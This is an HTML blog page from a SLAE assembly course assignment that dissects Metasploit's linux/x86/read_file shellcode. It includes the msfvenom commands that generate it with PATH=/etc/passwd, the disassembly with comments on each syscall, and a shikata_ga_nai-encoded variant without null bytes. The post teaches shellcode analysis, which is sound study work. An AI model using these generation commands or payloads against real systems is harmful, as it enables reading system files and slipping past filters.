@@ -1,0 +1,347 @@
+<!DOCTYPE html>
+<html lang="en-us">
+
+  <head>
+  <link href="http://gmpg.org/xfn/11" rel="profile">
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+
+  <title>
+    
+      SLAE Assignment 5.2 - Msfvenom linux/x86/read_file shellcode Analysis &middot; Lanyon
+    
+  </title>
+
+  
+  <link rel="canonical" href="http://localhost:4000/certification/2017/04/25/slae-msf-read_file-analysis/">
+  
+
+  <link rel="stylesheet" href="http://localhost:4000/public/css/poole.css">
+  <link rel="stylesheet" href="http://localhost:4000/public/css/syntax.css">
+  <link rel="stylesheet" href="http://localhost:4000/public/css/lanyon.css">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=PT+Serif:400,400italic,700%7CPT+Sans:400">
+
+  <link rel="apple-touch-icon-precomposed" sizes="144x144" href="http://localhost:4000/public/apple-touch-icon-precomposed.png">
+  <link rel="shortcut icon" href="http://localhost:4000/public/favicon.ico">
+
+  <link rel="alternate" type="application/rss+xml" title="RSS" href="http://localhost:4000/atom.xml">
+
+  
+</head>
+
+
+  <body>
+
+    <!-- Target for toggling the sidebar `.sidebar-checkbox` is for regular
+     styles, `#sidebar-checkbox` for behavior. -->
+<input type="checkbox" class="sidebar-checkbox" id="sidebar-checkbox" checked>
+
+<!-- Toggleable sidebar -->
+<div class="sidebar" id="sidebar">
+  <div class="sidebar-item">
+    <p>A reserved <a href="https://jekyllrb.com" target="_blank">Jekyll</a> theme that places the utmost gravity on content with a hidden drawer. Made by <a href="https://twitter.com/mdo" target="_blank">@mdo</a>.</p>
+  </div>
+
+  <nav class="sidebar-nav">
+    <a class="sidebar-nav-item" href="http://localhost:4000/">Home</a>
+
+    
+
+    
+    
+      
+        
+      
+    
+      
+        
+      
+    
+      
+        
+          <a class="sidebar-nav-item" href="http://localhost:4000/about/">About</a>
+        
+      
+    
+      
+    
+      
+    
+      
+        
+      
+    
+      
+        
+      
+    
+      
+        
+      
+    
+      
+        
+      
+    
+      
+        
+      
+    
+
+    <a class="sidebar-nav-item" href="/archive/v1.1.0.zip">Download</a>
+    <a class="sidebar-nav-item" href="">GitHub project</a>
+    <span class="sidebar-nav-item">Currently v1.1.0</span>
+  </nav>
+
+  <div class="sidebar-item">
+    <p>
+      &copy; 2020. All rights reserved.
+    </p>
+  </div>
+</div>
+
+
+    <!-- Wrap is the content to shift when toggling the sidebar. We wrap the
+         content to avoid any CSS collisions with our real content. -->
+    <div class="wrap">
+      <div class="masthead">
+        <div class="container">
+          <h3 class="masthead-title">
+            <a href="/" title="Home">Lanyon</a>
+            <small>A Jekyll theme</small>
+          </h3>
+        </div>
+      </div>
+
+      <div class="container content">
+        <div class="post">
+  <h1 class="post-title">SLAE Assignment 5.2 - Msfvenom linux/x86/read_file shellcode Analysis</h1>
+  <span class="post-date">25 Apr 2017</span>
+  <p><br />
+Student <strong>SLAE - 891</strong><br />
+Github: <a href="https://github.com/phackt/slae">https://github.com/phackt/slae</a><br />
+<a href="http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/">http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/</a></p>
+
+<h2 id="assignment-52">Assignment 5.2:</h2>
+
+<p><strong>Our Goal:</strong></p>
+<blockquote>
+  <p><em>Take up at least 3 linux/x86 shellcodes using Msfpayload (now Msfvenom)</em></p>
+  <ul>
+    <li><em>Use GDB/Ndisasm/Libemu to dissect the functionality of the shellcode</em></li>
+    <li><em>Present your analysis</em></li>
+  </ul>
+</blockquote>
+
+<p>Hello everybody,</p>
+
+<p>Here we are for the second analysis of our msf shellcodes.  Let’s perform the analysis for the <strong>linux/x86/read_file</strong> shellcode:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># msfvenom -p linux/x86/read_file --payload-options</span>
+Options <span class="k">for </span>payload/linux/x86/read_file:
+
+
+       Name: Linux Read File
+     Module: payload/linux/x86/read_file
+   Platform: Linux
+       Arch: x86
+Needs Admin: No
+ Total size: 62
+       Rank: Normal
+
+Provided by:
+    hal
+
+Basic options:
+Name  Current Setting  Required  Description
+<span class="nt">----</span>  <span class="nt">---------------</span>  <span class="nt">--------</span>  <span class="nt">-----------</span>
+FD    1                <span class="nb">yes       </span>The file descriptor to write output to
+PATH                   <span class="nb">yes       </span>The file path to <span class="nb">read
+
+</span>Description:
+  Read up to 4096 bytes from the <span class="nb">local </span>file system and write it back 
+  out to the specified file descriptor
+...
+</code></pre></div></div>
+
+<p>Let’s examine the generated shellcode:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># msfvenom -p linux/x86/read_file PATH=/etc/passwd -f raw | ndisasm -u -</span>
+No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+No Arch selected, selecting Arch: x86 from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 73 bytes
+
+00000000  EB36              jmp short 0x38
+00000002  B805000000        mov eax,0x5
+00000007  5B                pop ebx
+00000008  31C9              xor ecx,ecx
+0000000A  CD80              int 0x80
+0000000C  89C3              mov ebx,eax
+0000000E  B803000000        mov eax,0x3
+00000013  89E7              mov edi,esp
+00000015  89F9              mov ecx,edi
+00000017  BA00100000        mov edx,0x1000
+0000001C  CD80              int 0x80
+0000001E  89C2              mov edx,eax
+00000020  B804000000        mov eax,0x4
+00000025  BB01000000        mov ebx,0x1
+0000002A  CD80              int 0x80
+0000002C  B801000000        mov eax,0x1
+00000031  BB00000000        mov ebx,0x0
+00000036  CD80              int 0x80
+00000038  E8C5FFFFFF        call dword 0x2
+0000003D  2F                das
+0000003E  657463            gs jz 0xa4
+00000041  2F                das
+00000042  7061              jo 0xa5
+00000044  7373              jnc 0xb9
+00000046  7764              ja 0xac
+00000048  00                db 0x00
+</code></pre></div></div>
+
+<p>So let’s comment our shellcode instructions:</p>
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="nf">jmp</span> <span class="nv">short</span> <span class="mh">0x38</span>  <span class="c1">; jmp/call/pop technique</span>
+    <span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span><span class="mh">0x5</span>     <span class="c1">; int open(const char *pathname, int flags);</span>
+    <span class="nf">pop</span> <span class="nb">ebx</span>         <span class="c1">; pop the @ of the string starting at 0x3D</span>
+    <span class="nf">xor</span> <span class="nb">ecx</span><span class="p">,</span><span class="nb">ecx</span>     <span class="c1">; clears out ecx</span>
+    <span class="nf">int</span> <span class="mh">0x80</span>        <span class="c1">; open syscall</span>
+    <span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span><span class="nb">eax</span>     <span class="c1">; file descriptor result of the open syscall</span>
+    <span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span><span class="mh">0x3</span>     <span class="c1">; ssize_t read(int fd, void *buf, size_t count);</span>
+    <span class="nf">mov</span> <span class="nb">edi</span><span class="p">,</span><span class="nb">esp</span>     <span class="c1">; </span>
+    <span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span><span class="nb">edi</span>     <span class="c1">; pointer to a valid stack address</span>
+    <span class="nf">mov</span> <span class="nb">edx</span><span class="p">,</span><span class="mh">0x1000</span>  <span class="c1">; size of buffer that will be read and buffered to the stack</span>
+    <span class="nf">int</span> <span class="mh">0x80</span>        <span class="c1">; read syscall</span>
+    <span class="nf">mov</span> <span class="nb">edx</span><span class="p">,</span><span class="nb">eax</span>     <span class="c1">; result of read and third argument of write function</span>
+    <span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span><span class="mh">0x4</span>     <span class="c1">; ssize_t write(int fd, const void *buf, size_t count);</span>
+    <span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span><span class="mh">0x1</span>     <span class="c1">; standard output / ebx is still pointing to the buffer on stack</span>
+    <span class="nf">int</span> <span class="mh">0x80</span>        <span class="c1">; write syscall</span>
+    <span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span><span class="mh">0x1</span>     <span class="c1">; void _exit(int status);</span>
+    <span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span><span class="mh">0x0</span>     <span class="c1">; 0 everything is OK</span>
+    <span class="nf">int</span> <span class="mh">0x80</span>        <span class="c1">; exit syscall</span>
+    <span class="nf">call</span> <span class="kt">dword</span> <span class="mh">0x2</span>  <span class="c1">; pushing the @ of the following bytes (/etc/passwd) on the stack</span>
+    <span class="nf">das</span>
+    <span class="nf">gs</span> <span class="nv">jz</span> <span class="mh">0xa4</span>      
+    <span class="nf">das</span>
+    <span class="nf">jo</span> <span class="mh">0xa5</span>
+    <span class="nf">jnc</span> <span class="mh">0xb9</span>
+    <span class="nf">ja</span> <span class="mh">0xac</span>
+    <span class="kd">db</span> <span class="mh">0x00</span>         <span class="c1">; null byte ending string</span>
+</code></pre></div></div>
+
+<p>The jmp/call/pop technique will set the address of the following string in EBX:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># echo -e \\x2F\\x65\\x74\\x63\\x2F\\x70\\x61\\x73\\x73\\x77\\x64</span>
+/etc/passwd
+</code></pre></div></div>
+
+<p>Once again you can generate a shellcode (quite more complex) without null bytes with the following command:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># msfvenom -p linux/x86/read_file PATH=/etc/passwd -f raw -b \x00 | ndisasm -u -</span>
+No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+No Arch selected, selecting Arch: x86 from the payload
+Found 10 compatible encoders
+Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
+x86/shikata_ga_nai succeeded with size 100 <span class="o">(</span><span class="nv">iteration</span><span class="o">=</span>0<span class="o">)</span>
+x86/shikata_ga_nai chosen with final size 100
+Payload size: 100 bytes
+
+00000000  BAF7BD341A        mov edx,0x1a34bdf7
+00000005  DBDF              fcmovnu st7
+00000007  D97424F4          fnstenv <span class="o">[</span>esp-0xc]
+0000000B  5E                pop esi
+0000000C  29C9              sub ecx,ecx
+0000000E  B113              mov cl,0x13
+00000010  83EEFC            sub esi,byte <span class="nt">-0x4</span>
+00000013  31560F            xor <span class="o">[</span>esi+0xf],edx
+00000016  0356F8            add edx,[esi-0x8]
+00000019  5F                pop edi
+0000001A  C1                db 0xc1
+0000001B  F1                int1
+0000001C  3018              xor <span class="o">[</span>eax],bl
+0000001E  2F                das
+0000001F  06                push es
+00000020  3C58              cmp al,0x58
+00000022  6B37F5            imul esi,[edi],byte <span class="nt">-0xb</span>
+00000025  95                xchg eax,ebp
+00000026  0BBEC69E0FC1      or edi,[esi-0x3ef0613a]
+0000002C  C8DE8626          enter 0x86de,0x26
+00000030  41                inc ecx
+00000031  27                daa
+00000032  22A841D85364      and ch,[eax+0x6453d841]
+00000038  E151              loope 0x8b
+0000003A  91                xchg eax,ecx
+0000003B  CE                into
+0000003C  E561              <span class="k">in </span>eax,0x61
+0000003E  16                push ss
+0000003F  2F                das
+00000040  5E                pop esi
+00000041  60                pushad
+00000042  16                push ss
+00000043  2F                das
+00000044  A0AE9697A1        mov al,[0xa19796ae]
+00000049  3097E71A3097      xor <span class="o">[</span>edi-0x68cfe519],dl
+0000004F  E75C              out 0x5c,eax
+00000051  FC                cld
+00000052  17                pop ss
+00000053  0F9901            setns <span class="o">[</span>ecx]
+00000056  E82F0E9B63        call dword 0x639b0e8a
+0000005B  B37F              mov bl,0x7f
+0000005D  13ED              adc ebp,ebp
+0000005F  40                inc eax
+00000060  0CA4              or al,0xa4
+00000062  89                db 0x89
+00000063  A6                cmpsb
+</code></pre></div></div>
+
+<p>We can see, through the analysis of all of these shellcodes, the power of msfvenom while dynamically generating shellcodes.</p>
+
+<p>Hope you enjoyed this post, see you soon for the second msf shellcode analysis.</p>
+
+<p><a href="https://twitter.com/phackt_ul">Phackt</a></p>
+
+</div>
+
+
+<div class="related">
+  <h2>Related posts</h2>
+  <ul class="related-posts">
+    
+      <li>
+        <h3>
+          <a href="/dev/2020/05/27/git-secrets-exposed/">
+            What solutions to prevent git leaks ?
+            <small>27 May 2020</small>
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/web/2018/08/05/web-exposed-git-repositories/">
+            Gathering some information from web exposed git repositories
+            <small>05 Aug 2018</small>
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/web/2017/12/24/play-with-permissive-cors/">
+            Play with permissive CORS
+            <small>24 Dec 2017</small>
+          </a>
+        </h3>
+      </li>
+    
+  </ul>
+</div>
+
+
+      </div>
+    </div>
+
+
+    <!-- <label for="sidebar-checkbox" class="sidebar-toggle"></label> -->
+
+    <script src='/public/js/script.js'></script>
+ 
+  </body>
+</html>
